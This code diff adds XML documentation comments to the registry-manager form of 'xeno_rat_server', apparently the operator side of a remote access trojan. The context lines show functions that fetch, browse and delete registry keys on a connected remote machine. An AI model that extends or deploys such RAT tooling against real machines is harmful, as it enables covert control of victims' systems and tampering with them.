@@ -36,6 +36,15 @@ namespace xeno_rat_server.Forms
             StartAdd();
 
         }
+
+        /// <summary>
+        /// Executes the specified action when the given node is disconnected.
+        /// </summary>
+        /// <param name="node">The node to be checked for disconnection.</param>
+        /// <remarks>
+        /// This method checks if the provided <paramref name="node"/> is the same as the client node, and if it is not disposed.
+        /// If both conditions are met, it invokes the specified action to close the connection.
+        /// </remarks>
         public void TempOnDisconnect(Node node)
         {
             if (node == client)
@@ -49,6 +58,17 @@ namespace xeno_rat_server.Forms
                 }
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the process of adding registry information to the tree view.
+        /// </summary>
+        /// <remarks>
+        /// This method asynchronously retrieves registry information for "HKLM" and "HKCU" hives using the GetRegInfo method, and then populates the tree view with the retrieved information.
+        /// The retrieved information for each hive is added as a new TreeNode to the tree view, and then subkeys under each hive are added as child nodes to the respective hive nodes.
+        /// The tree view is updated once all the nodes are added.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when there is an error retrieving or populating registry information.</exception>
+        /// <returns>A Task representing the asynchronous operation.</returns>
         public async Task StartAdd() 
         {
             RegInfo HKLM = await GetRegInfo("HKLM");
@@ -72,6 +92,19 @@ namespace xeno_rat_server.Forms
             }
             treeView1.EndUpdate();
         }
+
+        /// <summary>
+        /// Retrieves registration information for the specified path.
+        /// </summary>
+        /// <param name="path">The path for which registration information is to be retrieved.</param>
+        /// <returns>The registration information for the specified <paramref name="path"/>.</returns>
+        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="path"/> is null.</exception>
+        /// <exception cref="InvalidOperationException">Thrown when the operation is invalid for the current state of the object.</exception>
+        /// <remarks>
+        /// This method sends the specified path to the client using the SendAsync method and then receives a response.
+        /// If the response indicates success, it deserializes the received data to obtain the registration information.
+        /// If the response indicates failure, it returns null.
+        /// </remarks>
         public async Task<RegInfo> GetRegInfo(string path)
         {
             byte[] opcode = new byte[] { 1 };
@@ -86,6 +119,16 @@ namespace xeno_rat_server.Forms
             byte[] SearlizedData = await client.ReceiveAsync();
             return DeserializeRegInfo(SearlizedData);
         }
+
+        /// <summary>
+        /// Deletes a registry subkey and returns a boolean indicating whether the operation was successful.
+        /// </summary>
+        /// <param name="path">The path of the registry subkey to be deleted.</param>
+        /// <returns>True if the registry subkey was successfully deleted; otherwise, false.</returns>
+        /// <remarks>
+        /// This method sends a delete opcode followed by the UTF-8 encoded path to the registry subkey to the client using asynchronous operations.
+        /// It then awaits the response from the client and returns a boolean indicating whether the deletion operation was successful.
+        /// </remarks>
         public async Task<bool> DeleteRegSubKey(string path) 
         {
             byte[] opcode = new byte[] { 2 };
@@ -95,6 +138,17 @@ namespace xeno_rat_server.Forms
             bool worked = (await client.ReceiveAsync())[0] == 1;
             return worked;
         }
+
+        /// <summary>
+        /// Deletes a registry key at the specified path and key and returns a boolean indicating whether the operation was successful.
+        /// </summary>
+        /// <param name="path">The path of the registry key to be deleted.</param>
+        /// <param name="key">The name of the registry key to be deleted.</param>
+        /// <returns>True if the registry key was successfully deleted; otherwise, false.</returns>
+        /// <remarks>
+        /// This method sends a delete operation request to the server using the specified path and key.
+        /// If the operation is successful, it returns true; otherwise, it returns false.
+        /// </remarks>
         public async Task<bool> DeleteRegKey(string path, string key)
         {
             byte[] opcode = new byte[] { 3 };
@@ -106,6 +160,16 @@ namespace xeno_rat_server.Forms
             bool worked = (await client.ReceiveAsync())[0] == 1;
             return worked;
         }
+
+        /// <summary>
+        /// Deserializes the byte array data into a RegInfo object.
+        /// </summary>
+        /// <param name="data">The byte array containing the serialized RegInfo data.</param>
+        /// <returns>The deserialized RegInfo object.</returns>
+        /// <remarks>
+        /// This method deserializes the byte array data into a RegInfo object by reading the data using a BinaryReader and populating the RegInfo properties based on the data read.
+        /// It handles various types of registry values such as REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, and REG_QWORD, and populates the RegInfo object with the corresponding values.
+        /// </remarks>
         public static RegInfo DeserializeRegInfo(byte[] data)
         {
             RegInfo regInfo = new RegInfo();
@@ -169,6 +233,18 @@ namespace xeno_rat_server.Forms
 
             return regInfo;
         }
+
+        /// <summary>
+        /// Handles the BeforeExpand event of the treeView1 control.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">A TreeViewCancelEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method asynchronously retrieves registry information for each node being expanded in the treeView1 control.
+        /// It sets the retrieved registry information as the Tag property of each node.
+        /// If the retrieved registry information is null, the method continues to the next node.
+        /// For each subkey in the retrieved registry information, a new TreeNode is added to the node being expanded, and the subkey is set as the Tag property of the new TreeNode.
+        /// </remarks>
         private async void treeView1_BeforeExpand(object sender, TreeViewCancelEventArgs e)
         {
             foreach (TreeNode i in e.Node.Nodes)
@@ -183,6 +259,15 @@ namespace xeno_rat_server.Forms
                 }
             }
         }
+
+        /// <summary>
+        /// Updates the listView1 based on the selected node in treeView1.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method updates the listView1 based on the selected node in treeView1. It clears the listView1, retrieves the RegInfo associated with the selected node, and populates the listView1 with the values from the RegInfo. The method handles different types of registry values and displays them accordingly in the listView1.
+        /// </remarks>
         private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
         {
             if (treeView1.SelectedNode != null)
@@ -220,11 +305,26 @@ namespace xeno_rat_server.Forms
                 textBox1.Text = clickedNode.FullPath;
             }
         }
+
+        /// <summary>
+        /// Occurs when the selected index of the ListView changes.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
         private void listView1_SelectedIndexChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Clears the text in textBox1, clears the items in listView1, clears the nodes in treeView1, and then starts the asynchronous operation StartAdd().
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method clears the text in textBox1, the items in listView1, and the nodes in treeView1 to prepare for the asynchronous operation StartAdd().
+        /// It then awaits the completion of StartAdd() to continue with further operations.
+        /// </remarks>
         private async void button1_Click(object sender, EventArgs e)
         {
             textBox1.Text = string.Empty;
@@ -234,10 +334,24 @@ namespace xeno_rat_server.Forms
 
         }
 
+        /// <summary>
+        /// Event handler for the Click event of the treeView1 control.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
         private void treeView1_Click(object sender, EventArgs e)
         {
         }
 
+        /// <summary>
+        /// Handles the event when a node in the tree view is clicked with the mouse.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">A TreeNodeMouseClickEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method checks if the right mouse button is clicked and, if so, creates a context menu with options related to the clicked node.
+        /// If an exception occurs during the process, a message box displaying "something went wrong..." is shown.
+        /// </remarks>
         private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
